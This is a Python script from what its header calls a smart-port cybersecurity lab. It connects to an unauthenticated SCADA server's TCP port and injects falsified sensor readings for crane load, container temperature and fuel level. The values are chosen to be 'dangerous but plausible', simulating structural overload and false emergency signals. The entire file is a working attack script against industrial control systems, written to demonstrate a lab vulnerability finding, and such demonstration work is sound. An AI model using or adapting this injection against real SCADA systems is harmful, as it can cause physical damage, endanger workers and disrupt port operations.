#!/usr/bin/env python3
"""
inject_v2.py — False sensor data injection into unauthenticated SCADA server
Smart Port Cybersecurity Lab — Tanger Med
Author: Naoual Wafiq

Connects directly to the SCADA server's TCP port 5020, which requires
ZERO authentication, and sends crafted sensor readings. Demonstrates
the physical-safety impact of SCADA-001 (CVSS 10.0).
"""

import socket
import json
import time

SCADA_HOST = "192.168.64.2"
SCADA_PORT = 5020

# Real values captured before injection (for comparison / reporting)
REAL_VALUES = {
    "crane_01_weight": 15709.0,   # kg
    "container_temp": 3.9,        # Celsius
    "fuel_level": 73.7,           # percent
}

# Falsified payload — chosen to be dangerous but plausible
INJECTED_VALUES = {
    "crane_01_weight": 38500.0,   # +145% — structural overload risk
    "container_temp": 87.5,       # cargo destruction simulated
    "fuel_level": 0.0,            # false emergency signal
}


def read_real_values(host, port, timeout=3):
    """Capture the current (real) sensor values before injecting."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        data = s.recv(1024).decode(errors="ignore")
        print(f"[CAPTURED] {data.strip()}")
        return data
    except Exception as e:
        print(f"[WARN] Could not read live values: {e}")
        return None
    finally:
        s.close()


def inject_payload(host, port, payload):
    """Send a crafted JSON payload to the SCADA server — no auth required."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((host, port))
        s.send(json.dumps(payload).encode())
        print(f"INJECTED: {payload}")
    finally:
        s.close()


if __name__ == "__main__":
    print("=== SmartPort SCADA Injection — inject_v2.py ===")
    print(f"Target: {SCADA_HOST}:{SCADA_PORT}\n")

    print("--- BEFORE (real values, captured via MitM) ---")
    for k, v in REAL_VALUES.items():
        print(f"{k:20}: {v}")

    time.sleep(1)

    print("\n--- Sending injection payload (zero auth required) ---")
    inject_payload(SCADA_HOST, SCADA_PORT, INJECTED_VALUES)

    print("\n--- AFTER (injected values) ---")
    for k, v in INJECTED_VALUES.items():
        print(f"{k:20}: {v}")

    print("\n[DONE] Server accepted injection — no authentication, no verification.")
